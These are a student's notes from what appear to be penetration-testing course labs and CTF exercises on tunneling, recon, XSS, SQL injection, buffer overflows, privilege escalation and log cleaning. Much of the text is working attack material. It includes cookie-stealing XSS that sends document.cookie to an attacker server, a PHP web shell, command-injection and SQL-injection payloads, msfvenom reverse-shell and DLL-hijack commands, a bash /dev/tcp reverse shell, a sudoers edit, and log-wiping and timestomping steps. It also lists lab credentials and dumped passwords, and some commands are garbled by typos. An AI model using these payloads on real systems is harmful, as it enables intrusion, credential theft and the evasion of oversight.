Record deleted successfully
Stack Number	Username	Password	jump
15 	ZANE-005-M 	ccfntq364w3wf0B 	10.50.33.126
Stack Number	Username	Password	jump
15 	ZANE-005-M 	kAjbrg8EgSX6FyF 	10.50.35.94



### Multiplexing command
```
ssh -MS /tmp/jump student@10.50.30.50
```
* Multiplexing allows us to connect to multiple hosts using the same ssh
* Stays persistent until connection closes
### Dynamic port forwarding on a socket
```
ssh -S /tmp/jump dummy -O forward -D9050
```
* -O is for general options
### Ruby Ping Sweep
```
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &) ; done
```

### Cancel a socket
```
ssh -S /tmp/jump dummy -O cancel <PORT>:<IP>:<PORT>
```
### Example Commands
```
ssh -MS /tmp/jump student@10.50.39.25
ssh -S /tmp/jump dummy -O forward -D9050
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &) ; done
proxychains nmap 192.168.28.1,2,3,97,98,99,100,105,111,120,129,130,131
proxychains nc 192.168.28.111 80
proxychains nc 192.168.29.100 80
ssh -S /tmp/jump dummy -O forward -L1111:192.168.111:80 -L2222:192.168.28.100
firefox 127.0.0.1:1111
ssh -S /tmp/jump dummy -O forward -L1111:192.168.111:80 -L2222:192.168.28.100 -L4444:192.168.28.111:22
ssh -MS /tmp/t1 student@127.0.0.1 -p 4444
ssh -S /tmp/t1 dummy -O forward -L5555:192.168.50.100:22
ssh -MS /tmp/t2 credentials@127.0.0.1 -p 5555
```
# Lecture

## Pen-Testing
#### Penetration testing overview
* Phase 1: Mission Definition
* Phase 2: Recon
* Phase 3: Footprinting
* Phase 4: Exmploitation/Initial Access
* Phase 5: Post-Exploitation
* Phase 6: Document Mission
#### Write a formal report
* Opnotes
* Formalized Report
  - Executive Summary
  - Technical Summary
* Operational Concerns
  - Offensive
  - Defensive

 
## Reconaissance
##### Example HTML Page - http://10.50.24.160/webexample/htmldemo.html
HTML Code from above link:
```
<!DOCTYPE html>
<html>
<head>
<title>Page Title </title>
</head>
<body>
<h1>This is a Heading, we can use h6, but makes items smaller</h1>
<h6>See its smaller</h6>
<p>This is a paragraph.</p>
<p>Paragraph with 2 lines <br>
this is the other line
</p>
<img src="shutterstock_246695119_1080.jpg" height="500" width="500"> <br>
<button type="button">Make a button, this one does nothing
<! Notice anything wrong with the button?  Oh and this is a comment>
</body>
</html>
```
#### Scraping Data
`pip install lxml requests`
```
#!/usr/bin/python
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)
```
* Things to change in the script
  - URL
  - xpath query
###### OUTPUTS:
```
Authors:  ['Albert Einstein', 'J.K. Rowling', 'Albert Einstein', 'Jane Austen', 'Marilyn Monroe', 'Albert Einstein', u’Andr\xe9 Gide', 'Thomas A. Edison', 'Eleanor Roosevelt', 'Steve Martin']
```
#### Script Management
Scripts are stored in a subdirectory of the Nmap data directory by default: `/usr/share/nmap/scripts`
```
nmap --script=http-enum 192.168.28.100
```
* Enumerates the directories and files on a web server


# CTF Notes
## Reconaissance
* Network scan `192.168.28.96/27`
* Network scan `192.168.150.224/27`
* Known URL: `consulting.site.donavia`



## Exploit and Research
### OUTPUT FROM RUBY PING SWEEP:
```
64 bytes from 192.168.28.97: icmp_seq=1 ttl=64 time=6.51 ms
64 bytes from 192.168.28.100: icmp_seq=1 ttl=63 time=2.83 ms
64 bytes from 192.168.28.98: icmp_seq=1 ttl=63 time=5.92 ms
64 bytes from 192.168.28.99: icmp_seq=1 ttl=63 time=4.69 ms
64 bytes from 192.168.28.105: icmp_seq=1 ttl=63 time=0.430 ms
64 bytes from 192.168.28.111: icmp_seq=1 ttl=63 time=0.721 ms
64 bytes from 192.168.28.120: icmp_seq=1 ttl=63 time=0.431 ms
```
#### NMAP Command filters on port 21
```
proxychains nmap 192.168.28.97,100,98,99,105,111,120 -p 21 --open 2>/dev/null
```
```192.168.28.105 has ftp open

PORT     STATE SERVICE
21/tcp   open  ftp
23/tcp   open  telnet
2222/tcp open  EtherNetIP-1


for i in {225..254}; do (ping -c 1 192.168.150.$i | grep "bytes from" &) ; done
64 bytes from 192.168.150.225: icmp_seq=1 ttl=64 time=0.811 ms
64 bytes from 192.168.150.226: icmp_seq=1 ttl=63 time=1.68 ms
64 bytes from 192.168.150.227: icmp_seq=1 ttl=63 time=2.31 ms


proxychains nmap -T4 192.168.28.97,100,98,99,105,111,120 -p80 --open

Nmap scan report for 192.168.28.100
Host is up (0.0015s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 192.168.28.111
Host is up (0.00100s latency).

PORT   STATE SERVICE
80/tcp open  http
```
# Tunnels Tunnels and Tunnels
* `ssh -MS /tmp/jump student@<JUMP>`
  - This makes a tunnel named jump and stores it in /tmp
* `ssh -S /tmp/jump jump -O forward -D9050`
  - This adds an option to the Tunnel "jump" ( The option is proxchains )
* `ssh -S /tmp/jump jump -O forward -L 1111:<IP>:80`
  - This adds a port forward to an IP at port 80 naming it the port 1111
* `ssh -MS /tmp/t1 billybob@127.0.0.1`
  - This creates a new tunnel using the port forward that was created with the tunnel "jump"

# Tunnel Example

```
LINOPS		JUMP		T1		T2		T3
```


* `TERMINAL_1>/> ssh -MS /tmp/jump student@<jump_IP>`
* Creates Tunnel to jump box

* `<TERMINAL_2>/> ssh -S /tmp/jump skibidi -O forward -D9050`
* Creates Dynamic Tunnel (PROXYCHAINS) on the jump box
* `<TERMINAL_2>/> ssh -S /tmp/jump skibidi -O cancel -D9050`
* Cancels proxychains on the jump box
* `<TERMINAL_2>/> ssh -S /tmp/jump skibidi -O forward -L 1111:<T1>:2222`
* Creates a forward to "T1" IP on alternate port 2222
* `<TERMINAL_2>/> firefox 127.0.0.1:1111`
* Opens website from the "T1" box with firefox
* `<TERMINAL_2>/> ssh -MS /tmp/t1 student@<127.0.0.1> -p 1111`
* Creates a New tunnel using the loopback and connects to the port forward that we made above

* `<TERMINAL_3>/> ssh -S /tmp/t1 stupid -O forward -D9050`
* Creates proxychains on t1
* `<TERMINAL_3>/> ssh -S /tmp/t1 stupid -O cancel -D9050`
* Cancels proxychains on t1
* `<TERMINAL_3>/> ssh -S /tmp/t1 skibidi -O forward -L 5678:<T2>2222`
* Creates a forward to "t2" IP on alternate port 2222
* `<TERMINAL_3>/> ssh -MS /tmp/t2 student@<127.0.0.1> -p 5678`
* Creates a new tunnel using the loopback and connects to the port forward that we made above

* `<TERMINAL_4>/> ssh -S /tmp/t2 dumb -O forward -D9050`
* Creates proxychains on t2
* `<TERMINAL_4>/> ssh -S /tmp/t2 dumb -O forward -L 1234:<t3_IP>:21 `
* Creates forward to t3 on port 21
# Day2
HTTP Methods

    GET
    POST
    HEAD
    PUT

HTTP Response Codes

    10X - Informational
    2XX - Success
    30X = Redirection
    4XX - Client Error
    5XX - Server Error

HTTP Fields

    User-Agent
    Referer
    Cookie
    Date
    Server
    Set-Cookie

JavaScript Interaction
```
<script>
function myFunction() {
    document.getElementById("demo").innerHTML = "Paragraph changed.";
}
```
```
</script>
<script src="https://www.w3schools.com/js/myScript1.js"></script>

    JS Demo - http://10.50.XX.XX/java/Javademo.html
```
Enumeration

    ROBOTS.TXT
        If you find this file, go to it and enumerate (There might be something important here)
    Legitimate surfing
    Tools:
        NSE scripts
        Nikto
        Burp suite (outside class)

Cross-Site scripting (XSS) Overview

    Insertion of arbitrary code into a webpage, that executes in the browser of visitors
    Unsanitized GET, POST, and POST methods allow JS to be placed on websites
    Often found in forums that allow HTML

Reflected XXS

    Most common form of XSS
    Transient, occurs in error messages or search results
    Delivered through intermediate media, such as a link in an emial
    Characters that are normally illegal in URLs can be Base64 encoded

Stored XSS

    Resides on vulnerable site
    Only requires user to visit page
    <img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
    <script>document.location="http://10.50.24.xxx:8000/"+document.cookie;</script>
Useful Javascript components

    Proof of concept (simple alert)
        <script>alert('XSS');</script>
    Capturing Cookies
        document.cookie
    Capturing Keystrokes
        bind keydown and keyup
    Capturing Sensitive Data
        document.body.innerHTML

Server-Side Injection

    Ability to read/execute outside web server's directory
    Uses ../../ (relative Paths) in manipulating a server-side file path
    www-data is the user that web servers on ubuntu or Apache, Nginx

Malicious File Upload

    Server Doesnt Validate extension or size
    Allows or code execution (shell)
    Once uploaded
        Find your file
        Call your file

Establishes a shell

<HTML><BODY>
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <?php
  if($_GET['cmd']) {
    system($_GET['cmd']);
    }
  ?>
  </pre>
  </BODY></HTML>

Command Injection

    User input not validated
    Might contain the following in it’s code:

system("ping -c 1 ".$_GET["ip"]);

    Run the following to chain/stack our arbitrary command

; cat /etc/passwd

Key Regen (SSH)

ssh-keygen -t rsa -b 4096
cat  /.ssh/id_rsa.pub
echo "your key" > /var/www/.ssh/authorized_keys

Demo

python3 -m http.server # This makes a webserver
<script>document.location="http://10.50.30.231:8000/"+document.cookie;</script> # This script steals cookies from users and sends it to our webserver

CTF

64 bytes from 10.100.28.33: icmp_seq=1 ttl=64 time=0.191 ms
64 bytes from 10.100.28.34: icmp_seq=1 ttl=63 time=1.31 ms
64 bytes from 10.100.28.35: icmp_seq=1 ttl=63 time=2.58 ms
64 bytes from 10.100.28.40: icmp_seq=1 ttl=63 time=0.593 ms
64 bytes from 10.100.28.48: icmp_seq=1 ttl=63 time=0.608 ms

Nmap scan report for 10.100.28.48
Host is up (0.00049s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
4444/tcp open  krb524

# day 5-6


# Buffer Overflow Common Terms
* Heap
* Stack
* Registers
* Instruction Pointer
* Stack Pointer
* Base Pointer
* Function
* Shellcode
# Buffer Overflow Defenses
* Non executable (NX) Stack
* Address Space Layout Randomization (ASLR)
* Data Execution Prevention (DEP)
* Stack Canaries
* Position Independent Excutable (PIE)
# GDB Uses
### Common Commands
```
disass <FUNCTION>     # Disassemble portion of the program
info <...>    # Supply info for specific stack areas
x/256c $<REGISTER>    # Read characters from specific register
break <address>    # Establish a break point
run <<<$(echo "asdfghjlklk")    # Goes into standard in of program. It makes it take an arguement before running the program
info functions    # Lists all the functions
pdisass main    # Lists the main function. (Can do this to any function)
info proc map    # Gets a map of the process
```
# Demo Linux
env - edb ./func
* [Buffer-Overflow-Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
  - Look for "EIP" It should have a specific value from the characters you overflowed it with, copy the hex value determine the overflow amount
* To see the size of the stack, do "info proc map" and note the line with [heap], the line below that has a start addr (this is the start of the stack). Note the end addr of the line that has [stack] in it.
* find /b command:
  - `0xff` is jmp
  - `0xe4` is ESP
* `\x90` is NOP
```
run <<<$(<./script>)0
# Find out the overflow value
# Exit
# Enter a fresh gdb session without peda
env - gdb ./func    # This allows you to do that ^
show env    # Lists variables
unset env <variable>    # This unsets a variable
info proc map    # Gets a map of the process
find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4    # find /b <starting location of stack>, <ending location of the stack>, <jmp>, <esp>
# Take first 4 and make them little endian
```
### Flipping bytes from big to little endian
```
#0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
#0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
#0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
#0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"
```
### MSFVENOM Command
* We are tellig it do create a payload that executes msf
* Then we are telling it that its going to execute the whoami command
* Then then tell it to not use the NULL Byte
* Finally we tell it to format it to python
```
msfvenom -p /linux/x86/exec CMD=whoami -b '\x00' -f python    # Creates payload
msfvenom --list payloads    # Lists all the payloads

```

## msfcon for linus
```
msfdb init
msfconsole
use payload/linux/x86/exec   
show options
set CMD whoami # set the command for the payload saw in options
generate -b '\x00' -f python #makes payload -b is tell it to not use the NULL Byte
```
# Demo Windows
### The Setup
* Run strings.exe on the executable
* Look for vulnerable variables
* Go to [Buffer-Overflow-Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) and generate the string that will narrow the buffer offset
* Make the python [script](scripts.md)
* Make sure the program crashes and the EIP returns with the value you set
### Immunity Debugger
TO find the first buff you may have to nc to an open port ;)
```
!mona modules    # This looks for vulnerable variables
!mona jmp -r esp -m "essfunc.dll"    # Looks through the variable for jmp and esp

```
### MSFVENOM COMMAND (lhost='LinOPS IP' lport='RHP')
```
msfvenom -p windows/shell/reverse_tcp lhost=10.50.30.231 lport=1234 -b "\x00" -f python
```
### MSFCONSOLE
```
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport <PORT SET IN MSFVENOM>
run
```
## 
# Lecture
#### SSH Keys
* Bring private key to your own box
* On your box:
  - `chmod 600 /home/student/stolenkey`
  - `ssh -i /home/student/stolenkey jane@1.2.3.4`
#### Local host enumeration
* `Net User` (Windows)
* `Cat /etc/passwd` (Linux)
#### Process Enumeration
* `Tasklist /v` (Windows)
* `ps -elf` (Linux)
#### Service Enumeration
* `Tasklist /svc` (Windows)
* `chkconfig` (SysV Linux)
* `systemctl --type=service` (SystemD Linux)
#### Network Connection Enumeration
* `IpConfig /all` (Windows)
* `IfConfig -a` (SysV Linux)
* `ip a` (SystemD Linux)
* `cat /etc/hosts` (Linux)
# SCP
* `scp <source> <destination>` (SCP Syntax)
#### Local to remote
* `scp /path/to/file.txt student@10.50.xx.xx:/path/to/destination/file.txt`
#### Remote to local
* `scp student@10.50.xx.xx:/path/to/destination/file.txt /path/to/destination/file.txt`
# CTF
```
http-enum.nse    # NMAP Script

```
# Windows
#### Scheduled Tasks and Services
* Write Permissions
* Non-Standard Locactions
* Unquoted Executable Paths
* Vulnerabilities in Executables
* Permissions to Run as `SYSTEM`
#### DEMO: Finding vulnerable Scheduled Tasks
##### DLL Stuff
* Can you rename the file?
* Can you write to the directory?
* Go to procmon:
  - filter by process name "Name of Process"
  - Filter result contains "NAME NOT FOUND"
  - filter path contains ".dll"
* MSFVENOM
  - `msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll`
  - SCP the file over to the windows station
#### EXE Replacement
* Can you rename the file?
* Can you write to the directory?
* MSFVENOM
  - `msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\users\student\desktop\whoami.txt' -f exe > putty.exe`
* Drag and drop the payload
```
auditpol /get /category:*
auditpol /get /category:* | findstr /i "success failure"
```
#### Important Microsoft Event IDs
* 4624/4625 - Successful/failed login
* 4720 - Account created
* 4672 - Adminstrative User logged on
* 7045 - Service Created

# Linux
#### Resources
* [GTFOBins](https://gtfobins.github.io)
#### Sudo Gotchas!
* Commands that can access the contents of other files
* Commands that download files
* Commands that execute other commands (Like editors)
* Dangerous Commands
#### SUID/SGID
* The User that owns the file can edit the file (SUID)
* The group that owns the file can edit the file (SGID)
* Everyone can edit the file, but only one user can delete the file (Sticky Bit)
* `find / -type f -perm /4000 -ls 2>/dev/null    # Find files with specific permissions (SUID: 4000) (SGID: 2000) (BOTH: 6000)`
#### Insecure Permissions
* CRON
  - `-l  # List`
  - `-e  # Edit`
  - `contab -u <user> -l  # List crontab for specific user`
* World-Writable Files and Directories
  - * `find / -type d -perm /2 -ls 2>/dev/null`
* Dot '.' in PATH
  - Lets you execute commands that are in your present working directory
  - `export PATH=".:$PATH"`
## Covering Your Tracks
#### Artifacts
* Things that we leave behind in a system
#### NIX-ism
* First thing: unset HISTILE
* Need to be  aware of init system in use
  - SYSTEMV, upstart, SYSTEMD, to name a few
  - Determines what commands to use and logging structure
* How to tell if sysV or Systemd `ps -p 1`
#### SystemD
* Utilizes `journalctl`
* `journalctl _TRANSPORT=audit | grep 603`
#### Working with Logs
```
file /var/log/wtmp
file /var/log -type f -mmin -10 2>/dev/null
journal -f -u ssh
journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
```
#### Cleaning The Logs (Basic)
* Before we start cleaining, save the INODE!
  - Affect on the inode of using `mv` vs `cp` vs `cat`
##### Get rid of it
* `rm -rf /var/log/...`
##### Clear it
* `cat /dev/null > /var/log/...`
* `echo > /var/log/...`
#### Cleaning The Logs (Precise)
##### GREP (Remove)
* `egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2`
##### SED (Replace)
* `cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log`
##### Timestomp
* `touch -c -t 201603051015 1.txt    # Explicit`
* `touch -r 3.txt 1.txt    # Reference`
#### Rsyslog
* Newer Rsyslog references `/etc/rsyslog.d/*` for settings/rules
* Older versions only uses `/etc/ryslog.conf`
* Find out with `grep "IncludeConfig /etc/rsyslog.conf`
```
kern.*                                                # All kernel messages, all severities
mail.crit
cron.!info,!debug
*.*  @192.168.10.254:514                                                    # Old format
*.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
#mail.*
```
# CTF
```
watch -n1 'ls -l'
/bin/bash -i >& /dev/tcp/192.168.28.135/33403 0>&1
/var/tmp/testbed/unknown /etc/sudoers 'comrade  ALL=(ALL:ALL) ALL'
```

https://gtfobins.github.io/
find / -type f -perm /6000 -ls 2>/dev/null
/var/spool/cron/crontabs

find / -type d -perm /2 -ls 2>/dev/null
auth.log/secure
	

Logins/authentications

lastlog
	Each users' last successful login time

btmp
	Bad login attempts

sulog
	Usage of SU command

utmp
	Currently logged in users (W command)

wtmp
	Permanent record on user on/off
/etc/rsyslog.conf



### http://10.50.29.140
# SQL Commands
* Select <-- extracts data from database
* Union <--  used to combine the reuslt of 2 or more statements
* Show Tables <--
* Show Columns <--
* Where <--
* Like <--
* Use
* Update
* Delete
* Insert into
* Create Database
* Alter Database
* Create Table
* Alter Table
* Drop Table
* Create Index
* Drop Index
### We are only extracting information in this module, so the only important onces that we will use are Union and Select
### At the end o every sql command you have to put a ";"
### 3 Default databases are information_schema, mysql, and performance_schema
## SQL Demo
```
mysql

show databases;

show tables from session; # Shows tables inside of session database

show colums from session.tires; # Shows all the colums that are in the tires table inside of the session database

select name,tireid,size,cost, from session.tires; # This shows the data inside of session.tires

show columns from session.car;

select carid,name,cost,size from session.tires union select carid,color,cost from session.car; # selects multiple things and joins them in the output
```
# Injecting
* SELECT id FROM users WHERE name=‘[tom' OR 1='1’ AND pass=‘tom' OR 1='1’]
  - You are forcing a boolean that will result in true into the user and password variable
### SQL Injecting Demo / authentication bypass
```
' OR 1='1
# Once we got in, we opened the developer console (inspect) and found a username variable
# Make sure to click the radio button to see information in RAW format
# We then copied that variable added a "?" to the url because we are passing information and pasted the variable
# After doing this we were shown usernames and passwords in that variable
```
### Demo POST (text box)
1. Identify vulnerable field
2. Identify number of columns
3. Craft the golden statement
4. Craft the query
5. Craft Queries
```
# step 1Identify vulnerable field
Audi' OR 1='1

# step 2 Identify Columns
Audi' UNION SELECT 1,2,3,4,5 #     5 columns 

# step 3 Create Golden Statement
Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #    because we want 3 columns we need 2 and 5 as placeholders
[Audi ' UNION SELECT <column>,<column>,<column> FROM database.table #

# step 4/5 Craft Query
Audi ' UNION SELECT studentID,2,username,passwd,5 FROM session.userinfo #
Audi ' UNION SELECT id,2,name,pass,5 FROM session.user #
Audi ' UNION SELECT username,2,passwd,jump,5 FROM session.userinfo #
Audi ' UNION SELECT tireid,2,size,cost,5 FROM session.Tires #
Audi ' UNION SELECT carid,name,color,cost,5 FROM sessin.car #         wont shoow column 2 due to it being hidden
```
## use placeholders when there are more columns than values youre looking for 
### DEMO GET (search bar) USE MORE
```
http://10.50.29.140/uniondemo.php?Selection=1&Submit=Submit      replace submit=submit
# In the search bar replace & with:
OR 1=1

# Identify vulnerable field (selection 2)
?Selection=3 UNION SELECT 1,2,3

# Identify number of columns (3, displayed in 1,3,2 order)
?Selection=3 UNION SELECT 1,2,3

# Golden Statement order displayed in 1,3,2
?Selection=3 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns

?Selection=3 UNION SELECT id,pass,name FROM session.user

' union select @@version #- this gets the version of the database (put as a value like color or size n the left side of statement 

# Anbotate databases, tables, and columns
Database: session

session
Tables: Tires,car,session_log,user,userinfo

Columns
(Tires): tireid, name, size, cost
(car): carid, name, type, cost, color, year
etc....
```
`delete from comments where ID = 57; 57`


## theyre case sensitive
## SSgt dow demos 
SHOW DATABSES ; 
use information schema ;
  show columns ; 
  show columns from columns ; 
  select table_name,column_name from information_schema.columns ;
 ## select table_schema,table_name,column_name from information_schema.columns ;

show tables from session ;

show columns from session.tires ;

select tireid,name,size from session.tires ;

show columns from session.car

select tireid,name,size from session.tires UNION SELECT name,type,cost from session.car ;

select tireid,name,size,4 from session.tires UNION SELECT name,type,cost,color from session.car ; color needs the 4 there to be added as 4 is the placeholder for it and pay attention to the number of columns 


## union select rquires 2 columns thats where placeholders come in 




## show columns from <database>.<table> ; syntax for small queries

=, !=, < <=, >, >=	Standard numerical operators	col_name != 4
BETWEEN … AND …	Number is within range of two values (inclusive)	col_name BETWEEN 1.5 AND 10.5
NOT BETWEEN … AND …	Number is not within range of two values (inclusive)	col_name NOT BETWEEN 1 AND 10
IN (…)	Number exists in a list	col_name IN (2, 4, 6)
NOT IN (…)	Number does not exist in a list	col_name NOT IN (1, 3, 5)


## sqlbolt.com activity
SELECT Director FROM Movies; gets directrs from movies
SELECT Title FROM Movies;
SELECT Title,Director FROM Movies;
SELECT Title,Year FROM Movies; 
SELECT * FROM Movies; gets all columns from mthe movies table 
SELECT <column> FROM <table>

SELECT id, title FROM movies    finds the movie with the id of 6
WHERE id = 6;

SELECT Year, title FROM movies       finds the movies released between 2000 and 2010
WHERE Year >= 2000 AND Year <=2010;

SELECT Year, title FROM movies                   finds movies not between 2000 and 2010
WHERE Year NOT BETWEEN 2000 AND 2010 ;

SELECT Title, Year FROM movies             Find the first 5 Pixar movies and their release year 
 WHERE Year BETWEEN 1995 AND 2003;

SELECT Title FROM movies            finds all toy story movies
WHERE Title LIKE "Toy Story%";

SELECT * FROM movies                finds all movies by john lassester
WHERE Director = "John Lasseter";
  ## LIKE "%word%" is used t find a string in a word 
SELECT * FROM movies              finds all WALL-E movies
WHERE Title LIKE "WALL%";



## CTFs
#1 ' UNION SELECT table_schema,table_name FROM information_schema.columns #
column_name
#2 
' UNION SELECT table_schema,table_name FROM information_schema.columns #
sqlinjection	categories
sqlinjection	members
sqlinjection	orderlines
sqlinjection	orders
sqlinjection	payments
sqlinjection	permissions
sqlinjection	products
sqlinjection	share4


#3
http://127.0.0.1:11751/cases/productsCategory.php?category=1%20union%20select%20permission,username,password%20FROM%20sqlinjection.members
after category 1 do union select permission,username,password FROM sqlinjection.members you need 3 fields because it uses 3 fields 

Boss	BRJHlIX600KYqu6JHCpa	1.00
Maverick	turn&burn	3.00
phreak	pwd	4.00
Susan	flowers99	3.00
TW	imAPlaya	2.00
1-2-3-4	sayULuvM3	2.00
rich_kid	1M$	2.00
p0pStar	thrilla	2.00
Joe	vato

#4

#5 
' union select @@version #

#6
switch sqlinjection to payments table 

## golden statement
  ' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns #
      >use placeholders when we n eed more columns like numbers, also this is a baseline and will help set up and carry the rest of the injections 

















# SETUP
### IP
```
10.50.27.14
```





















# OPNOTES
#### SQL
```
pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
1,3,2
BestWebApp PASSWORDS:
user2  ::  RntyrfVfNER78
user3  ::  Obo4GURRnccyrf
Lee-Roth  ::  anotherpassword4THEages
```
1 	apasswordyPa$$word 	$Aaron
2 	EaglesIsARE78 		$user2
3 	Bob4THEEapples 		$user3
4 	anotherpassword4THEages 	$Lroth

File to read: root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin 
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash 
mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false 
user2:x:1001:1001::/home/user2:/bin/sh 
### reviwe of dry run
nmap 10.50.27.14
22 ssh
80 http
---
namp 10.50.27.14 --script=http-enum.nse
/login.php
/loging.html
/img/
---
fire fox
	10.50.27.14
 		Login page
   			usr 1' or 1 ='1
      			pass 1' or 1 ='1
	 		http post and and ? and the raw string all passwords
    		info page
      			../../../etc/passwd
	 		../../../etc/hosts

## reviwe 
 recon
 webex without crosssite 
 reverse engineering
 		if ( x * 18 + 72) {
   			code
      			}
	 	## 72 /18 to find x
   		## x >> 4 = 12 bit shit 12 to the left 4 times
 exploit development win and luixs
 post ex check the locals that give awwarness 
 win esaltion know to to get prives
 lin esaltion hot to get prives
 

